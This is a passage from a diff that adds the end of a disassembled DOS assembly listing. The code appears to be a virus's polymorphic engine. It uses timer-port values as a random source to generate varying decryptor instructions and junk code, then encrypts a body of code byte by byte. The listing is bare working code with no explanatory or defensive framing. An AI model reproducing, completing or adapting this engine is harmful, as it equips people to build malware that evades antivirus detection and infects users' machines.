+                db  45h ; E
+                db    9 ;
+                db 0C0h ; А
+                db    5 ;
+                db 0E8h ; и
+                db  2Dh ; -
+                db 0A6h ; ¦
+                db 0A6h ; ¦
+                db 0ACh ; ¬
+                db 0AEh ; ®
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_973:
+                mov     cx, word ptr byte_0_456+10h
+                xor     cx, 1
+                add     cx, cx
+                dec     cx
+                jmp short loc_0_980
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_980:
+                call    loc_0_9BC
+                stosb
+                mov     byte ptr loc_0_8A4+1, ah
+                in      ax, 40h
+                stosw
+                mov     word ptr loc_0_8A6, ax
+                push    cx
+                jmp short loc_0_992
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_992:
+                call    loc_0_AC1
+                pop     cx
+                call    loc_0_9BC
+                stosb
+                mov     byte ptr loc_0_8A7+1, ah
+                stosw
+                mov     word ptr loc_0_8A9, ax
+
+loc_0_9A2:
+                and     ax, 0
+                add     ax, 1157h
+                add     ax, 0EEA8h
+                cmp     ax, cx
+                jz      locret_0_9BB
+                inc     word ptr es:[di-2]
+                inc     word ptr loc_0_8A9
+                cmp     cx, cx
+                jmp short loc_0_9A2
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+locret_0_9BB:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_9BC:
+                mov     al, 81h
+                jmp short loc_0_9C1
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_9C1:
+                stosb
+                call    Get_Byte_01
+                cbw
+                add     ax, ax
+                nop
+                add     ax, 86Bh
+                mov     si, ax
+                mov     ax, [si]
+                or      al, byte ptr byte_0_456+12h
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_9D5:
+                call    Get_Word_0123
+                mov     si, ax
+                add     si, si
+                cmp     al, al
+                jmp     word ptr [si+863h]
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                call    Get_Byte_01
+                jz      loc_0_973
+                mov     al, byte ptr byte_0_456+10h
+                shl     al, 1
+                shl     al, 1
+                shl     al, 1
+                or      al, 40h
+                or      al, byte ptr byte_0_456+12h
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+                call    Get_Byte_0123
+                or      al, 81h
+                mov     ah, 0C0h
+                or      ah, byte ptr byte_0_456+12h
+                test    byte ptr byte_0_456+10h, 1
+                jz      loc_0_A0E
+                or      ah, 28h
+
+loc_0_A0E:
+                stosw
+                test    si, 1
+                jnz     loc_0_A23
+                cmp     al, 83h
+                jnz     loc_0_A23
+                mov     al, 0FFh
+                xor     byte ptr byte_0_456+10h, 1
+                jmp short loc_0_A26
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_A23:
+                and     ax, 1
+
+loc_0_A26:
+                stosw
+                cmp     byte ptr es:[di-4], 81h
+                jz      locret_0_A2F
+                dec     di
+
+locret_0_A2F:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                mov     ah, byte ptr byte_0_456+10h
+                mov     al, 0FFh
+                shl     ah, 1
+                shl     ah, 1
+                shl     ah, 1
+                or      ah, 0C0h
+                or      ah, byte ptr byte_0_456+12h
+                stosw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                test    byte ptr byte_0_456+10h, 1
+                jz      loc_0_A52
+                mov     al, 0FDh
+                stosb
+                call    loc_0_AC1
+
+loc_0_A52:
+                mov     al, byte ptr byte_0_456+12h
+                cmp     al, 6
+                jnb     loc_0_A5D
+                nop
+                jmp     loc_0_9D5
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_A5D:
+                call    loc_0_A61
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_A61:
+                and     ah, 2
+                and     al, 1
+                xor     al, ah
+                mov     bx, 86Fh
+                xlat
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_A6E:
+                mov     byte ptr byte_0_456+0Eh, 1
+                call    loc_0_AC1
+                mov     byte ptr byte_0_456+0Eh, 0
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_A7C:
+                mov     si, word ptr byte_0_456+16h
+                cmp     si, 0
+                jnz     loc_0_A88
+                jmp short locret_0_A9B
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_A88:
+                mov     ax, di
+                sub     ax, si
+                cmp     ax, 0
+                jz      locret_0_A9B
+                mov     es:[si-1], al
+                mov     word ptr byte_0_456+16h, 0
+
+locret_0_A9B:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_A9C:
+                mov     bx, 46Eh
+                call    loc_0_AAB
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_AA3:
+                nop
+                mov     bx, 470h
+                call    loc_0_AAB
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_AAB:
+                mov     si, [bx]
+                cmp     si, 0
+                jz      locret_0_AC0
+                mov     ax, di
+                add     ax, word ptr byte_0_456+6
+                nop
+                mov     es:[si], ax
+                mov     word ptr [bx], 0
+
+locret_0_AC0:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_AC1:
+                call    Get_Word_0123
+                mov     cx, ax
+                adc     cx, 3
+
+loc_0_AC9:
+                cmp     byte ptr byte_0_456+0Eh, 1
+                jnz     loc_0_ADA
+                call    loc_0_CF0
+                jmp short loc_0_AD7
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+                nop
+
+loc_0_AD7:
+                jmp short loc_0_ADD
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_ADA:
+                call    loc_0_AE9
+
+loc_0_ADD:
+                call    loc_0_A7C
+                loop    loc_0_AC9
+                mov     word ptr byte_0_456+16h, 0
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_AE9:
+                add     ax, es:[di]
+                neg     ax
+                mov     byte ptr byte_0_456+0Fh, al
+                cmp     al, 0A8h
+                jz      loc_0_B12
+                cmp     al, 0A1h
+                jz      loc_0_B6C
+                cmp     al, 0A0h
+                jz      loc_0_B6C
+                cmp     al, 0A9h
+                jz      loc_0_B6C
+                cmp     al, 40h
+                jnb     loc_0_B72
+                mov     ah, al
+                and     al, 7
+                cmp     al, 4
+                jb      loc_0_B18
+                and     ah, 0FDh
+                mov     al, ah
+
+loc_0_B12:
+                nop
+                stosb
+                call    loc_0_625
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B18:
+                cmp     ah, 38h
+                jb      loc_0_B20
+                jmp short loc_0_B23
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_B20:
+                or      ah, 2
+
+loc_0_B23:
+                call    loc_0_64D
+                mov     dl, al
+                and     dl, 0C0h
+                cmp     dl, 0C0h
+                jz      loc_0_B33
+                jmp short loc_0_B37
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_B33:
+                xchg    ah, al
+                stosw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B37:
+                cmp     dl, 0
+                jz      loc_0_B3F
+                jmp short loc_0_B50
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_B3F:
+                and     al, 38h
+                or      al, 6
+                xchg    ah, al
+                stosw
+
+loc_0_B46:
+                in      ax, 40h
+                nop
+                cmp     ax, 0FFFFh
+                jz      loc_0_B46
+                stosw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B50:
+                test    ah, 1
+                jz      loc_0_B57
+                jmp short loc_0_B3F
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B57:
+                xchg    ah, al
+                stosw
+                mov     al, ah
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                cbw
+                add     di, ax
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B6C:
+                stosb
+                jmp short loc_0_B46
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B6F:
+                jmp     loc_0_C26
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B72:
+                cmp     al, 70h
+                jnb     loc_0_B6F
+                cmp     al, 60h
+                jnb     loc_0_BCB
+                cmp     al, 50h
+                jnb     loc_0_BF0
+                mov     byte ptr cs:byte_0_456+0Fh, 1
+                call    loc_0_65F
+                and     al, 1Fh
+                or      al, 40h
+                cmp     al, 50h
+                jnb     loc_0_B91
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_B91:
+                in      al, 40h
+                and     al, 0Fh
+                mov     bx, 493h
+                xlat
+                stosb
+                cmp     al, 0FFh
+                jz      loc_0_BA1
+                jmp short loc_0_BA9
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_BA1:
+                call    loc_0_65F
+                and     al, 3
+                or      al, 0F0h
+                stosb
+
+loc_0_BA9:
+                call    loc_0_CFB
+                mov     byte ptr cs:byte_0_456+0Fh, 1
+                call    loc_0_65F
+                and     al, 47h
+                test    al, 40h
+                jnz     loc_0_BBE
+                jmp short loc_0_BC7
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_BBE:
+                mov     ah, al
+                or      ah, 0C0h
+                mov     al, 8Fh
+                stosw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_BC7:
+                or      al, 58h
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_BCB:
+                push    cx
+                in      ax, 40h
+                add     ah, al
+                mov     bx, 4A3h
+                mov     cx, 8
+
+loc_0_BD6:
+                mov     dx, [bx]
+                cmp     ah, dl
+                jnb     loc_0_BDF
+                jmp short loc_0_BE3
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_BDF:
+                cmp     ah, dh
+                jbe     loc_0_BEB
+
+loc_0_BE3:
+                inc     bx
+                inc     bx
+                nop
+                loop    loc_0_BD6
+                pop     cx
+                jmp short loc_0_BCB
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_BEB:
+                mov     al, 0CDh
+                stosw
+                pop     cx
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_BF0:
+                and     al, 9
+                or      al, 0F6h
+                stosb
+                mov     bl, al
+
+loc_0_BF7:
+                call    Get_Byte_0_7
+                cmp     al, 6
+                jnb     loc_0_BF7
+                cmp     bl, 0FEh
+                jb      loc_0_C05
+                and     al, 1
+
+loc_0_C05:
+                mov     ah, al
+                call    loc_0_65F
+                and     al, 7
+                or      al, 0C0h
+                shl     ah, 1
+                shl     ah, 1
+                shl     ah, 1
+                or      al, ah
+                stosb
+                mov     al, bl
+                cmp     al, 0FEh
+                jnb     locret_0_C25
+                cmp     ah, 10h
+                jnb     locret_0_C25
+                call    loc_0_625
+
+locret_0_C25:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_C26:
+                cmp     al, 0A0h
+                jnb     loc_0_C4B
+                cmp     al, 80h
+                jnb     loc_0_C59
+                in      ax, 40h
+                and     al, 1Fh
+                test    al, 10h
+                jnz     loc_0_C4E
+                mov     bx, 483h
+                cbw
+                add     bx, ax
+                mov     ah, [bx]
+                cmp     al, 0Bh
+                jnb     loc_0_C47
+                call    Get_Byte_01
+                add     ah, al
+
+loc_0_C47:
+                mov     al, ah
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_C4B:
+                jmp short loc_0_CB0
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_C4E:
+                or      al, 70h
+                and     ah, 0
+                stosw
+                mov     word ptr byte_0_456+16h, di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_C59:
+                call    Get_Byte_0123
+                or      al, 80h
+                nop
+                mov     byte ptr byte_0_456+0Fh, al
+                stosb
+                push    ax
+
+loc_0_C64:
+                call    loc_0_65F
+                mov     ah, al
+                and     ah, 0C0h
+                cmp     ah, 0
+                jz      loc_0_C78
+                cmp     ah, 0C0h
+                jz      loc_0_C9E
+                jmp short loc_0_C64
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_C78:
+                and     al, 38h
+                or      al, 6
+                stosb
+                mov     word ptr byte_0_456+18h, di
+                call    Get_Word_0_7
+                sub     ax, 0Ah
+                add     ax, word ptr byte_0_456+1Ch
+                cmp     word ptr byte_0_456+1Ch, 0
+                jz      loc_0_C95
+                jmp short loc_0_C97
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_C95:
+                mov     ax, di
+
+loc_0_C97:
+                add     ax, word ptr byte_0_456+6
+                stosb
+                mov     al, ah
+
+loc_0_C9E:
+                stosb
+                pop     ax
+                cmp     al, 81h
+                jz      loc_0_CA7
+                jmp short loc_0_CAE
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_CA7:
+                call    loc_0_AA3
+                call    loc_0_A9C
+                inc     di
+
+loc_0_CAE:
+                inc     di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_CB0:
+                cmp     al, 0C0h
+                jb      loc_0_CF0
+                cmp     al, 0D0h
+                jb      loc_0_CC5
+                cmp     al, 0E0h
+                jb      loc_0_CD9
+                cmp     al, 0E4h
+                jb      loc_0_CE7
+                cmp     ah, al
+                jmp short loc_0_CF0
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_CC5:
+                mov     ah, al
+                and     ah, 0F1h
+                call    loc_0_65F
+                or      al, 0C0h
+                xchg    ah, al
+                stosw
+                jmp short loc_0_CD7
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+                jmp short loc_0_CC5
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_CD7:
+                inc     di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_CD9:
+                mov     ah, al
+                and     ah, 0F3h
+                call    loc_0_65F
+                or      al, 0C0h
+                xchg    ah, al
+                stosw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_CE7:
+                and     ah, 0
+                stosw
+                mov     word ptr byte_0_456+16h, di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_CF0:
+                call    Get_Byte_0_7
+                cmp     al, 3
+                jz      loc_0_D4E
+
+loc_0_CF7:
+                cmp     al, 2
+
+loc_0_CF9:
+                jz      loc_0_D23
+
+loc_0_CFB:
+                call    Get_Byte_01
+                jz      loc_0_D03
+                jmp     loc_0_DC2
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_D03:
+                call    loc_0_65F
+                and     al, 7
+                nop
+                test    byte ptr byte_0_456+0Fh, 1
+                jz      loc_0_D12
+                or      al, 8
+
+loc_0_D12:
+                or      al, 0B0h
+                stosb
+                cmp     al, 0B8h
+                jb      loc_0_D21
+                call    loc_0_A9C
+                nop
+                call    loc_0_AA3
+                inc     di
+
+loc_0_D21:
+                inc     di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_D23:
+                call    Get_Byte_01
+                or      al, 0C6h
+                mov     ah, 6
+                stosw
+                mov     word ptr byte_0_456+1Ah, di
+                push    ax
+                call    Get_Word_0_7
+                sub     ax, 0Ah
+                add     ax, word ptr byte_0_456+1Ch
+                nop
+                cmp     word ptr byte_0_456+1Ch, 0
+                jnz     loc_0_D44
+                mov     ax, di
+
+loc_0_D44:
+                add     ax, word ptr byte_0_456+6
+                stosw
+                pop     ax
+                call    loc_0_625
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_D4E:
+                call    Get_Byte_0123
+                mov     bx, 4B3h
+                xlat
+                stosb
+                cmp     al, 68h
+                jnz     loc_0_D5D
+                jmp short loc_0_D92
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_D5D:
+                push    ax
+                call    Get_Word_0_7
+                inc     ax
+                inc     ax
+                stosw
+                push    ax
+                call    loc_0_AA3
+                nop
+                call    loc_0_A9C
+                pop     ax
+                add     di, ax
+                pop     ax
+                cmp     al, 0E8h
+                jz      loc_0_D77
+                jmp short loc_0_D84
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_D77:
+                mov     byte ptr byte_0_456+0Fh, 1
+                call    loc_0_65F
+                and     al, 7
+                or      al, 58h
+                stosb
+
+loc_0_D84:
+                cmp     al, 0EBh
+                jnz     locret_0_D91
+                jmp short loc_0_D90
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+                cmp     ah, 0EBh
+                jz      loc_0_D84
+
+loc_0_D90:
+                dec     di
+
+locret_0_D91:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_D92:
+                push    di
+                inc     di
+                inc     di
+                call    loc_0_CFB
+                call    Get_Byte_01
+                or      al, 0C2h
+                stosb
+                cmp     al, 0C3h
+                jz      loc_0_DA6
+                and     ax, 0
+                stosw
+
+loc_0_DA6:
+                pop     si
+                call    Get_Word_0_7
+                add     di, ax
+                mov     ax, di
+                add     ax, word ptr byte_0_456+6
+                mov     es:[si], ax
+                jmp short loc_0_DC0
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+                xor     bx, 0C2h
+                cmp     bl, bh
+                jnb     loc_0_DA6
+
+loc_0_DC0:
+                jmp short locret_0_D91
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_DC2:
+                call    Get_Byte_0123
+                add     al, 88h
+                stosb
+                mov     byte ptr byte_0_456+0Fh, al
+                cmp     al, 8Ah
+                jb      loc_0_DD5
+                call    loc_0_64D
+                jmp short loc_0_DD8
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_DD5:
+                call    loc_0_65F
+
+loc_0_DD8:
+                or      al, 0C0h
+                stosb
+                nop
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_DDD:
+                mov     bx, word ptr byte_0_456+1Eh
+                test    byte ptr byte_0_456+10h, 1
+                jz      loc_0_DEC
+                mov     bx, word ptr byte_0_456+20h
+
+loc_0_DEC:
+                call    loc_0_E16
+                lds     si, dword ptr byte_0_456+0Ah
+                mov     cx, word ptr byte_0_456+8
+
+loc_0_DF7:
+                lodsb
+                stc
+                sub     al, 2Dh
+                stosb
+                loop    loc_0_DF7
+                push    cs
+                pop     ds
+                mov     bx, word ptr byte_0_456+20h
+                test    byte ptr byte_0_456+10h, 1
+                jz      loc_0_E0F
+                mov     bx, word ptr byte_0_456+1Eh
+
+loc_0_E0F:
+                call    loc_0_E16
+                call    loc_0_7B5
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_E16:
+                nop
+                mov     ax, di
+                add     ax, word ptr byte_0_456+6
+                nop
+                sub     ax, word ptr byte_0_456+14h
+                mov     dx, word ptr byte_0_456+10h
+                sub     ax, dx
+                nop
+                test    bp, 8000h
+                jz      loc_0_E34
+                add     ax, dx
+                add     ax, dx
+                dec     ax
+
+loc_0_E34:
+                mov     es:[bx], ax
+                cmp     ah, al
+                jz      locret_0_E3E
+                jmp short locret_0_E3F
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+locret_0_E3E:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+locret_0_E3F:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+_End:
+seg000          ends
+
+                end start
